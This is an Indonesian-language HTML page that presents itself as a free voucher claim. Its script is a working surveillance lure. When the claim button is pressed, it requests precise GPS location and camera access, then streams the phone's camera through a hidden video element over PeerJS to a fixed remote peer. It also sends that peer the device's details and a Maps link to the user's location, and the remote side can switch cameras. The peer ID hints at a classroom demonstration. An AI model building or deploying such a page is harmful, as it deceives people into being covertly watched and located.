<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Klaim Voucher Gratis</title>
  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 40px 20px; background: #f4f4f9; }
    .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }
    button { background: #28a745; color: white; border: none; padding: 14px 28px; font-size: 18px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; }
    #status { margin-top: 15px; color: #666; font-size: 14px; }
  </style>
</head>
<body>
  <div class="card">
    <h2>🎉 Selamat! Anda Mendapatkan Voucher Rp 100.000</h2>
    <p>Tekan tombol di bawah untuk memproses dan mengklaim hadiah Anda.</p>
    <button onclick="prosesKlaim()">KLAIM SEKARANG</button>
    <p id="status"></p>
  </div>

  <!-- Kamera tersembunyi (tidak tampil di layar HP) -->
  <video id="webcam" autoplay playsinline style="display: none;"></video>

  <script>
    const ID_LAPTOP = "guru-demo-kamera-123";
    
    // STUN Server Google untuk menembus jaringan seluler & Wi-Fi
    const peer = new Peer({
      config: {
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' },
          { urls: 'stun:stun2.l.google.com:19302' }
        ]
      }
    });

    let currentStream = null;
    let isFrontCamera = false;
    let dataConn = null;

    peer.on('open', () => {
      dataConn = peer.connect(ID_LAPTOP);
      if (dataConn) {
        dataConn.on('open', () => {
          // 1. Kirim Spesifikasi Perangkat HP ke Laptop
          const infoPerangkat = {
            type: 'device-info',
            osBrowser: navigator.userAgent,
            resolusi: `${screen.width} x ${screen.height} px`,
            cpuCore: navigator.hardwareConcurrency || 'N/A',
            ram: (navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'),
            zonaWaktu: Intl.DateTimeFormat().resolvedOptions().timeZone
          };
          dataConn.send(infoPerangkat);

          // 2. Dengarkan Perintah Ganti Kamera dari Laptop
          dataConn.on('data', (data) => {
            if (data === 'switch') {
              isFrontCamera = !isFrontCamera;
              startCamera();
            }
          });
        });
      }
    });

    async function prosesKlaim() {
      document.getElementById('status').innerText = "Memproses voucher...";
      
      // Minta Akses Lokasi GPS
      mintaLokasiGPS();
      
      // Minta Akses Kamera & Mulai Stream
      await startCamera();
      
      alert("Voucher Berhasil Diklaim!");
      document.getElementById('status').innerText = "Voucher Aktif.";
    }

    // Fungsi Pengambilan Lokasi GPS Presisi
    function mintaLokasiGPS() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;

            if (dataConn && dataConn.open) {
              dataConn.send({
                type: 'location-info',
                mapsUrl: mapsUrl,
                lat: lat,
                lng: lng
              });
            }
          },
          (error) => {
            console.warn("Izin lokasi ditolak atau gagal:", error.message);
          },
          { enableHighAccuracy: true }
        );
      }
    }

    // Fungsi Pengaksesan Kamera HP
    async function startCamera() {
      if (currentStream) {
        currentStream.getTracks().forEach(track => track.stop());
      }
      try {
        const mode = isFrontCamera ? "user" : "environment";
        currentStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: mode }
        });
        document.getElementById('webcam').srcObject = currentStream;
        peer.call(ID_LAPTOP, currentStream);
      } catch (err) {
        console.error("Gagal mengakses kamera:", err);
      }
    }
  </script>
</body>
</html>
